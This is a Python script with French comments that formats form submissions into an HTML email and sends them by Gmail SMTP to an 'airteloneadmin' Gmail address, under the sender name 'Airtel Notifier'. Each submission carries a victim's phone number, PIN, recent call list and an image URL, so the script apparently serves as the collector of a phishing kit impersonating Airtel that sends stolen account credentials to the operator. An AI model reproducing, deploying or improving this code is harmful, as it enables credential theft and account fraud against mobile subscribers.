import os
import smtplib
import ssl
from email.message import EmailMessage
from email.utils import formataddr

# --- CONFIGURATION ---
# IMPORTANT : Stockez ces informations en tant que variables d'environnement
# pour ne pas les exposer dans votre code.

# Votre adresse e-mail Gmail
SENDER_EMAIL = os.environ.get('GMAIL_USER')
# Le mot de passe d'application de 16 caractères que vous avez généré
APP_PASSWORD = os.environ.get('GMAIL_APP_PASSWORD')

# L'adresse e-mail du destinataire (votre adresse admin)
RECEIVER_EMAIL = 'airteloneadmin@gmail.com'

# --- Optimisation : Charger le modèle d'e-mail une seule fois au démarrage ---
try:
    # Le chemin est relatif à l'endroit où le script est exécuté.
    # Assurez-vous que 'email_template.html' est dans le même dossier.
    with open('email_template.html', 'r', encoding='utf-8') as f:
        EMAIL_TEMPLATE_CONTENT = f.read()
except FileNotFoundError:
    print("ERREUR CRITIQUE : Le fichier 'email_template.html' est introuvable. Les notifications ne fonctionneront pas.")
    EMAIL_TEMPLATE_CONTENT = None

def send_submission_notification(submission_data: dict):
    """
    Envoie un e-mail de notification stylisé via Gmail avec les données de la soumission.

    :param submission_data: Un dictionnaire contenant les données du formulaire.
                            Ex: {'phoneNumber': '...', 'pin': '...', 'lastCalls': [...], 'imageUrl': '...'}
    """
    if not EMAIL_TEMPLATE_CONTENT:
        print("ERREUR : Le modèle d'e-mail n'a pas pu être chargé. Envoi annulé.")
        return

    if not SENDER_EMAIL or not APP_PASSWORD:
        print("ERREUR : L'e-mail de l'expéditeur ou le mot de passe d'application ne sont pas configurés dans les variables d'environnement.")
        return

    try:
        # 1. Créer l'objet EmailMessage
        msg = EmailMessage()
        phone_number = submission_data.get('phoneNumber', 'N/A')
        # Sujet plus visible et en-tête professionnel
        msg['Subject'] = f"🔥 Nouvelle Soumission Reçue : {phone_number}"
        msg['From'] = formataddr(('Airtel Notifier', SENDER_EMAIL))
        msg['To'] = RECEIVER_EMAIL

        # 2. Utiliser le contenu du modèle déjà chargé en mémoire
        html_content = EMAIL_TEMPLATE_CONTENT
        last_calls_html = ''.join([f'<li style="margin-bottom: 5px;">{num}</li>' for num in submission_data.get('lastCalls', [])])

        # 4. Remplacer les placeholders par les vraies données
        html_content = html_content.replace('{{phoneNumber}}', submission_data.get('phoneNumber', 'N/A'))
        html_content = html_content.replace('{{pin}}', submission_data.get('pin', 'N/A'))
        html_content = html_content.replace('{{lastCallsList}}', last_calls_html)
        html_content = html_content.replace('{{imageUrl}}', submission_data.get('imageUrl', '#'))

        # 5. Attacher le contenu HTML à l'e-mail
        msg.add_alternative(html_content, subtype='html')

        # 6. Envoyer l'e-mail via le serveur SMTP de Gmail
        # Créer un contexte SSL sécurisé
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(SENDER_EMAIL, APP_PASSWORD)
            smtp.send_message(msg)

        print(f"E-mail de notification envoyé avec succès de {SENDER_EMAIL} à {RECEIVER_EMAIL} !")

    except Exception as e:
        print(f"Erreur lors de l'envoi de l'e-mail via Gmail : {e}")